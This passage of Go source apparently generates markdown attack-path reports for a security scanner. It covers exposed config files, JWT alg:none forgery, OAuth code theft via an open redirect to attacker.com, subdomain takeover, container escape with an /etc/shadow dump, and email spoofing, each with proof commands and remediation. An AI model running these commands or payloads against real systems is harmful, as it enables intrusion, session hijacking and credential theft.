	fmt.Fprintf(&b, "**Impact:** Attacker harvests credentials from exposed config and pivots to the internal data tier.\n\n")

	fmt.Fprintf(&b, "### Step 1: Configuration File Exposed\n")
	fmt.Fprintf(&b, "The file `%s` on `%s` is publicly accessible and contains\n", filePath, asset)
	fmt.Fprintf(&b, "service credentials:\n")
	fmt.Fprintf(&b, "```\n%s\n```\n\n", snippet)
	fmt.Fprintf(&b, "**Proof:** `curl -s 'https://%s%s'`\n\n", asset, filePath)

	fmt.Fprintf(&b, "### Step 2: Credential Extraction\n")
	fmt.Fprintf(&b, "The attacker parses the response for database URLs, API keys,\n")
	fmt.Fprintf(&b, "cloud credentials, and internal service endpoints. Common patterns:\n")
	fmt.Fprintf(&b, "- `DATABASE_URL`, `DB_PASSWORD`, `REDIS_URL`\n")
	fmt.Fprintf(&b, "- `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`\n")
	fmt.Fprintf(&b, "- `API_KEY`, `SECRET_KEY`, `JWT_SECRET`\n\n")

	fmt.Fprintf(&b, "### Step 3: Lateral Movement to Data Tier\n")
	fmt.Fprintf(&b, "Using extracted credentials, the attacker connects to the %s\n", targetCheck)
	fmt.Fprintf(&b, "at `%s:%s`, accessing the internal data tier directly.\n\n", targetHost, targetPort)
	fmt.Fprintf(&b, "**Proof:** `psql -h %s -p %s -U <user> <dbname>`\n\n", targetHost, targetPort)

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Remove or deny access to exposed configuration files\n")
	fmt.Fprintf(&b, "- **Rotate:** Rotate all credentials found in the exposed file\n")
	fmt.Fprintf(&b, "- **Network:** Restrict database access to application servers only (security groups/firewall)\n")
	fmt.Fprintf(&b, "- **Secrets management:** Move credentials to a secrets manager (Vault, AWS Secrets Manager)\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. `curl -s 'https://%s%s'` — fetch exposed config\n", asset, filePath)
	fmt.Fprintf(&b, "2. Extract `DATABASE_URL` and parse host, port, username, password\n")
	fmt.Fprintf(&b, "3. `psql -h %s -p %s -U <user> <dbname>` — connect to database\n", targetHost, targetPort)
	fmt.Fprintf(&b, "4. `SELECT * FROM users LIMIT 10;` — exfiltrate data\n")

	return b.String()
}

func narrativeJWTAuthBypass(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	weakness := evi(cf, "jwt_weakness", "weak algorithm")
	url := evi(cf, "url", "https://"+asset+"/api")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: JWT Weakness → Authentication Bypass → Sensitive Data Access\n\n")
	fmt.Fprintf(&b, "**Impact:** Attacker forges JWT tokens to bypass authentication and access any API endpoint as any user.\n\n")

	fmt.Fprintf(&b, "### Step 1: JWT Implementation Flaw\n")
	fmt.Fprintf(&b, "The JWT implementation on `%s` has a critical weakness: **%s**.\n", asset, weakness)
	fmt.Fprintf(&b, "This allows an attacker to create arbitrary valid tokens without the signing key.\n\n")

	fmt.Fprintf(&b, "### Step 2: Token Forgery\n")
	fmt.Fprintf(&b, "The attacker crafts a JWT with elevated claims:\n")
	fmt.Fprintf(&b, "```json\n{\"sub\": \"admin\", \"role\": \"administrator\", \"iat\": 1700000000}\n```\n")
	fmt.Fprintf(&b, "The token is accepted because the server does not properly validate the signature.\n\n")
	fmt.Fprintf(&b, "**Proof:** `python3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, '', algorithm='none'))\"`\n\n")

	fmt.Fprintf(&b, "### Step 3: API Data Access\n")
	fmt.Fprintf(&b, "With the forged admin token, the attacker accesses all protected API endpoints:\n")
	fmt.Fprintf(&b, "- User data: `GET /api/users`\n")
	fmt.Fprintf(&b, "- Admin functions: `POST /api/admin/settings`\n")
	fmt.Fprintf(&b, "- Sensitive data: `GET /api/export/database`\n\n")
	fmt.Fprintf(&b, "**Proof:** `curl -H 'Authorization: Bearer <forged_token>' '%s/api/admin/users'`\n\n", url)

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Enforce RS256 or ES256 algorithm validation; reject alg:none\n")
	fmt.Fprintf(&b, "- **Key management:** Use strong, unique signing keys (min 256-bit)\n")
	fmt.Fprintf(&b, "- **Validation:** Validate all JWT claims server-side (iss, aud, exp, nbf)\n")
	fmt.Fprintf(&b, "- **Rotation:** Implement short token expiry with refresh token rotation\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Identify JWT weakness (e.g., accepts `alg: none`)\n")
	fmt.Fprintf(&b, "2. Forge token: `{\"alg\":\"none\"}.{\"sub\":\"admin\",\"role\":\"admin\"}.`\n")
	fmt.Fprintf(&b, "3. `curl -H 'Authorization: Bearer <token>' '%s/api/admin/users'`\n", url)
	fmt.Fprintf(&b, "4. Extract sensitive data from API responses\n")

	return b.String()
}

func narrativeOpenRedirectOAuth(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	redirectURL := evi(cf, "url", "https://"+asset+"/redirect")
	redirectParam := evi(cf, "parameter", "url")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Open Redirect → OAuth Authorization Code Theft → Account Takeover\n\n")
	fmt.Fprintf(&b, "**Impact:** Attacker steals OAuth tokens via open redirect on the callback domain — full account takeover.\n\n")

	fmt.Fprintf(&b, "### Step 1: Open Redirect Vulnerability\n")
	fmt.Fprintf(&b, "The endpoint `%s` redirects to any URL via the `%s` parameter\n", redirectURL, redirectParam)
	fmt.Fprintf(&b, "without validation. Since it is on the same domain as the OAuth callback,\n")
	fmt.Fprintf(&b, "it can be used as a redirect_uri that the OAuth provider trusts.\n\n")
	fmt.Fprintf(&b, "**Proof:** `curl -sI '%s?%s=https://attacker.com'`\n\n", redirectURL, redirectParam)

	fmt.Fprintf(&b, "### Step 2: OAuth Flow Hijack\n")
	fmt.Fprintf(&b, "The attacker crafts an OAuth authorization URL that uses the open redirect\n")
	fmt.Fprintf(&b, "as the `redirect_uri`. The OAuth provider validates the domain (which matches)\n")
	fmt.Fprintf(&b, "but the path redirects the authorization code to the attacker's server.\n\n")

	fmt.Fprintf(&b, "### Step 3: Token Exchange & Account Takeover\n")
	fmt.Fprintf(&b, "The attacker's server receives the authorization code and exchanges it\n")
	fmt.Fprintf(&b, "for access/refresh tokens, gaining full account access.\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Fix the open redirect — allowlist valid redirect destinations\n")
	fmt.Fprintf(&b, "- **OAuth:** Use exact redirect_uri matching (not prefix/domain matching)\n")
	fmt.Fprintf(&b, "- **PKCE:** Enforce PKCE for all OAuth flows to prevent code interception\n")
	fmt.Fprintf(&b, "- **State:** Validate the `state` parameter to prevent CSRF on OAuth callbacks\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Craft URL: `https://%s/oauth/authorize?client_id=...&redirect_uri=%s?%s=https://attacker.com/steal`\n", asset, redirectURL, redirectParam)
	fmt.Fprintf(&b, "2. Send crafted URL to victim (phishing, social engineering)\n")
	fmt.Fprintf(&b, "3. Victim authenticates; OAuth provider redirects to open redirect\n")
	fmt.Fprintf(&b, "4. Open redirect forwards `?code=AUTH_CODE` to attacker's server\n")
	fmt.Fprintf(&b, "5. Attacker exchanges code for tokens → full account access\n")

	return b.String()
}

func narrativeSubdomainTakeoverSession(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	subdomain := evi(cf, "takeover_asset", "dangling."+asset)
	provider := evi(cf, "cloud_provider", "cloud provider")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Subdomain Takeover → Parent-Domain Cookie Injection → Session Hijack\n\n")
	fmt.Fprintf(&b, "**Impact:** Attacker claims abandoned subdomain and hijacks sessions on the main application.\n\n")

	fmt.Fprintf(&b, "### Step 1: Dangling DNS Record\n")
	fmt.Fprintf(&b, "The subdomain `%s` has a DNS record (CNAME/A) pointing to a %s\n", subdomain, provider)
	fmt.Fprintf(&b, "resource that no longer exists. An attacker can claim this resource.\n\n")
	fmt.Fprintf(&b, "**Proof:** `dig CNAME %s` — shows dangling record\n\n", subdomain)

	fmt.Fprintf(&b, "### Step 2: Subdomain Claim\n")
	fmt.Fprintf(&b, "The attacker registers the target resource with the %s and serves\n", provider)
	fmt.Fprintf(&b, "their own content at `%s`. Browsers now trust this subdomain.\n\n", subdomain)

	fmt.Fprintf(&b, "### Step 3: Cookie Injection for Parent Domain\n")
	fmt.Fprintf(&b, "From the claimed subdomain, the attacker serves a page that sets cookies\n")
	fmt.Fprintf(&b, "scoped to `.%s` (the parent domain):\n", asset)
	fmt.Fprintf(&b, "```\nSet-Cookie: session=attacker_value; Domain=.%s; Path=/; Secure\n```\n", asset)
	fmt.Fprintf(&b, "This overwrites or shadows the legitimate session cookie.\n\n")

	fmt.Fprintf(&b, "### Step 4: Session Hijack on Main Application\n")
	fmt.Fprintf(&b, "When the victim visits the main application at `%s`, the browser sends\n", asset)
	fmt.Fprintf(&b, "the attacker-controlled cookie, allowing session fixation or hijacking.\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Remove dangling DNS records for decommissioned services\n")
	fmt.Fprintf(&b, "- **Cookies:** Use `__Host-` cookie prefix (prevents Domain attribute override)\n")
	fmt.Fprintf(&b, "- **Monitoring:** Continuously monitor DNS records for dangling references\n")
	fmt.Fprintf(&b, "- **HSTS:** Deploy HSTS with includeSubDomains to prevent downgrade attacks\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Discover dangling DNS: `dig CNAME %s`\n", subdomain)
	fmt.Fprintf(&b, "2. Claim the %s resource for `%s`\n", provider, subdomain)
	fmt.Fprintf(&b, "3. Serve page: `Set-Cookie: session=evil; Domain=.%s`\n", asset)
	fmt.Fprintf(&b, "4. Victim visits `%s` → hijacked session\n", subdomain)
	fmt.Fprintf(&b, "5. Victim's next request to `%s` uses attacker's cookie\n", asset)

	return b.String()
}

func narrativeWeakTLSCredIntercept(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	tlsWeakness := evi(cf, "tls_weakness", "weak cipher suite")
	authService := evi(cf, "auth_check", "login form")
	url := evi(cf, "url", "https://"+asset)

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Weak TLS → Man-in-the-Middle → Credential Interception\n\n")
	fmt.Fprintf(&b, "**Impact:** Credentials transmitted to `%s` can be intercepted by a network attacker.\n\n", asset)

	fmt.Fprintf(&b, "### Step 1: Weak TLS Configuration\n")
	fmt.Fprintf(&b, "The server at `%s` supports %s, which is vulnerable to\n", asset, tlsWeakness)
	fmt.Fprintf(&b, "known cryptographic attacks that allow connection downgrade or decryption.\n\n")
	fmt.Fprintf(&b, "**Proof:** `testssl --vulnerable %s`\n\n", url)

	fmt.Fprintf(&b, "### Step 2: Authentication Service Detected\n")
	fmt.Fprintf(&b, "The service handles authentication (%s), meaning credentials\n", authService)
	fmt.Fprintf(&b, "(usernames, passwords, session tokens) are transmitted over this connection.\n\n")

	fmt.Fprintf(&b, "### Step 3: Man-in-the-Middle Credential Theft\n")
	fmt.Fprintf(&b, "An attacker on the network path (same WiFi, ISP, BGP hijack) can:\n")
	fmt.Fprintf(&b, "- Downgrade the TLS connection to exploit the weak configuration\n")
	fmt.Fprintf(&b, "- Intercept credentials in transit\n")
	fmt.Fprintf(&b, "- Replay stolen credentials for unauthorized access\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1; enforce TLS 1.2+ only\n")
	fmt.Fprintf(&b, "- **Ciphers:** Remove weak ciphers (RC4, DES, 3DES, export ciphers); prefer AEAD ciphers\n")
	fmt.Fprintf(&b, "- **PFS:** Enable perfect forward secrecy (ECDHE key exchange)\n")
	fmt.Fprintf(&b, "- **HSTS:** Deploy HSTS with long max-age to prevent protocol downgrade\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Position on network path (ARP spoofing, rogue WiFi, etc.)\n")
	fmt.Fprintf(&b, "2. Force TLS downgrade to vulnerable protocol/cipher\n")
	fmt.Fprintf(&b, "3. Intercept traffic to `%s` login endpoint\n", asset)
	fmt.Fprintf(&b, "4. Extract credentials from decrypted traffic\n")
	fmt.Fprintf(&b, "5. Replay credentials for authenticated access\n")

	return b.String()
}

func narrativeContainerEscape(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	apiType := evi(cf, "api_check", "container orchestration API")
	containerIssue := evi(cf, "container_check", "container vulnerability")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Exposed Container API → Container Escape → Host Compromise\n\n")
	fmt.Fprintf(&b, "**Impact:** Full host compromise — attacker escapes container and controls all workloads on the host.\n\n")

	fmt.Fprintf(&b, "### Step 1: Exposed Container Orchestration API\n")
	fmt.Fprintf(&b, "The %s on `%s` is accessible without authentication,\n", apiType, asset)
	fmt.Fprintf(&b, "allowing anyone to manage containers, deployments, and pods.\n\n")

	fmt.Fprintf(&b, "### Step 2: Container Vulnerability\n")
	fmt.Fprintf(&b, "The %s provides additional leverage — the attacker\n", containerIssue)
	fmt.Fprintf(&b, "can deploy privileged containers or exploit existing weaknesses.\n\n")

	fmt.Fprintf(&b, "### Step 3: Container Escape\n")
	fmt.Fprintf(&b, "The attacker deploys a privileged container with the host filesystem mounted:\n")
	fmt.Fprintf(&b, "```json\n{\"Image\": \"alpine\", \"HostConfig\": {\"Privileged\": true, \"Binds\": [\"/:/mnt\"]}}\n```\n")
	fmt.Fprintf(&b, "This grants full read/write access to the host filesystem from within the container.\n\n")

	fmt.Fprintf(&b, "### Step 4: Host Takeover\n")
	fmt.Fprintf(&b, "From the host filesystem the attacker can:\n")
	fmt.Fprintf(&b, "- Read `/etc/shadow` for password hashes\n")
	fmt.Fprintf(&b, "- Install SSH keys for persistent access\n")
	fmt.Fprintf(&b, "- Access secrets for all other containers on the host\n")
	fmt.Fprintf(&b, "- Pivot to the container network and other hosts\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Restrict container API access (require mTLS or firewall rules)\n")
	fmt.Fprintf(&b, "- **RBAC:** Enforce Kubernetes RBAC; never expose kubelet or Docker API publicly\n")
	fmt.Fprintf(&b, "- **Pod security:** Deny privileged containers and host mounts via PodSecurityPolicy/OPA\n")
	fmt.Fprintf(&b, "- **Network:** Isolate container management plane from public networks\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Enumerate exposed API: `curl http://%s:2375/containers/json`\n", asset)
	fmt.Fprintf(&b, "2. Deploy privileged container with host mount\n")
	fmt.Fprintf(&b, "3. `chroot /mnt /bin/bash` — escape to host\n")
	fmt.Fprintf(&b, "4. `cat /mnt/etc/shadow` — dump credentials\n")
	fmt.Fprintf(&b, "5. Install persistence and pivot to other hosts\n")

	return b.String()
}

func narrativeEmailSpoofPhish(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	spoofCheck := evi(cf, "spoof_check", "email.dmarc_missing")
	dkimCheck := evi(cf, "dkim_check", "email.dkim_missing")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Email Spoofing → Phishing Campaign → Credential Harvest\n\n")
	fmt.Fprintf(&b, "**Impact:** Attacker sends convincing phishing emails as `%s` — employees are tricked into revealing credentials.\n\n", asset)

	fmt.Fprintf(&b, "### Step 1: Missing Email Authentication (DMARC/SPF)\n")
	fmt.Fprintf(&b, "The domain `%s` lacks proper email authentication (%s).\n", asset, spoofCheck)
	fmt.Fprintf(&b, "There is no DMARC policy to reject forged emails, and SPF is either missing\n")
	fmt.Fprintf(&b, "or uses a soft-fail policy that does not block spoofed messages.\n\n")
	fmt.Fprintf(&b, "**Proof:** `dig TXT _dmarc.%s` and `dig TXT %s`\n\n", asset, asset)

	fmt.Fprintf(&b, "### Step 2: Missing DKIM Signature Validation\n")
	fmt.Fprintf(&b, "DKIM is not configured (%s), so recipient mail servers cannot\n", dkimCheck)
	fmt.Fprintf(&b, "verify that emails actually originated from `%s`. Forged emails appear\n", asset)
	fmt.Fprintf(&b, "legitimate to both mail servers and end users.\n\n")
	fmt.Fprintf(&b, "**Proof:** `dig TXT default._domainkey.%s`\n\n", asset)

	fmt.Fprintf(&b, "### Step 3: Phishing Campaign\n")
	fmt.Fprintf(&b, "The attacker sends emails that appear to come from `ceo@%s` or\n", asset)
	fmt.Fprintf(&b, "`it-security@%s` containing:\n", asset)
	fmt.Fprintf(&b, "- Urgent password reset links pointing to attacker-controlled pages\n")
	fmt.Fprintf(&b, "- Fake internal announcements with credential harvesting forms\n")
	fmt.Fprintf(&b, "- Malicious attachments disguised as company documents\n\n")

	fmt.Fprintf(&b, "### Step 4: Credential Harvest → Internal Access\n")
	fmt.Fprintf(&b, "Employees enter credentials on the phishing page, giving the attacker\n")
	fmt.Fprintf(&b, "access to email, VPN, internal applications, and cloud services.\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Publish DMARC with `p=reject` policy\n")
	fmt.Fprintf(&b, "- **SPF:** Update SPF to `-all` (hard fail) and list only authorized senders\n")
	fmt.Fprintf(&b, "- **DKIM:** Configure DKIM signing with 2048-bit keys for all outbound mail\n")
	fmt.Fprintf(&b, "- **Training:** Conduct phishing awareness training for employees\n")
	fmt.Fprintf(&b, "- **MFA:** Enforce MFA on all accounts to limit credential theft impact\n\n")

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Confirm spoofability: `dig TXT _dmarc.%s` — no reject policy\n", asset)
	fmt.Fprintf(&b, "2. `swaks --to victim@example.com --from ceo@%s --header 'Subject: Urgent Action Required'`\n", asset)
	fmt.Fprintf(&b, "3. Email arrives in inbox (not spam) — no DMARC/DKIM rejection\n")
	fmt.Fprintf(&b, "4. Employee clicks link → enters credentials on phishing page\n")
	fmt.Fprintf(&b, "5. Attacker uses harvested credentials for internal access\n")

	return b.String()
}

func narrativeVersionCVEMatch(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	cveID := evi(cf, "cve_check", "CVE-XXXX-XXXXX")
	cveSeverity := evi(cf, "cve_severity", "high")
	service := evi(cf, "service", "detected service")
	version := evi(cf, "version", "X.Y.Z")

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: Version Disclosure → Known CVE Match → Exploitation\n\n")
	fmt.Fprintf(&b, "**Impact:** Service version exposed enables targeted exploitation of known vulnerability %s (%s severity).\n\n", cveID, cveSeverity)

	fmt.Fprintf(&b, "### Step 1: Service Version Disclosure\n")
	fmt.Fprintf(&b, "The %s on `%s` discloses its version (`%s`) via HTTP headers,\n", service, asset, version)
	fmt.Fprintf(&b, "error pages, or banner information. This gives attackers exact version\n")
	fmt.Fprintf(&b, "information to select matching exploits.\n\n")

	fmt.Fprintf(&b, "### Step 2: CVE Identification\n")
	fmt.Fprintf(&b, "Version `%s` matches the affected version range for **%s** (%s severity).\n", version, cveID, cveSeverity)
	fmt.Fprintf(&b, "The vulnerability has known public exploits available.\n\n")

	fmt.Fprintf(&b, "### Step 3: Targeted Exploitation\n")
	fmt.Fprintf(&b, "The attacker uses the exact version information to select and configure\n")
	fmt.Fprintf(&b, "the correct exploit, significantly increasing reliability compared to blind\n")
	fmt.Fprintf(&b, "scanning. The version match confirms the target is vulnerable.\n\n")

	fmt.Fprintf(&b, "### Remediation\n")
	fmt.Fprintf(&b, "- **Immediate:** Patch the service to a version not affected by %s\n", cveID)
	fmt.Fprintf(&b, "- **Headers:** Remove or obfuscate version information from HTTP headers and error pages\n")
	fmt.Fprintf(&b, "- **WAF:** Deploy WAF rules for known exploit patterns\n")
	fmt.Fprintf(&b, "- **Monitoring:** Monitor for exploitation attempts matching %s signatures\n\n", cveID)

	fmt.Fprintf(&b, "### Combined Attack\n")
	fmt.Fprintf(&b, "1. Identify version: response headers or error pages reveal `%s %s`\n", service, version)
	fmt.Fprintf(&b, "2. Match to %s in vulnerability database\n", cveID)
	fmt.Fprintf(&b, "3. Select matching exploit (Metasploit, nuclei template, or custom PoC)\n")
	fmt.Fprintf(&b, "4. Execute exploit against `%s`\n", asset)
	fmt.Fprintf(&b, "5. Achieve impact described in CVE advisory\n")

	return b.String()
}

func narrativeGeneric(cf finding.Finding, all []finding.Finding) string {
	asset := cf.Asset
	url := evi(cf, "url", "https://"+asset)

	var b strings.Builder
	fmt.Fprintf(&b, "## Attack Path: %s\n\n", cf.Title)
	fmt.Fprintf(&b, "**Impact:** %s\n\n", cf.Description)

	// Build steps from related findings.
	related := findRelated(cf, all)
	if len(related) > 0 {
		for i, r := range related {
			if i >= 5 {
				break
			}
			fmt.Fprintf(&b, "### Step %d: %s\n", i+1, r.Title)
			rURL := evi(r, "url", url)
			fmt.Fprintf(&b, "%s at `%s`.\n\n", r.Description, rURL)
		}
	} else {
		fmt.Fprintf(&b, "### Step 1: Initial Access\n")
		fmt.Fprintf(&b, "The attacker exploits the vulnerability at `%s`.\n\n", url)
		fmt.Fprintf(&b, "### Step 2: Exploitation\n")
		fmt.Fprintf(&b, "%s\n\n", cf.Description)
	}

	return b.String()
}
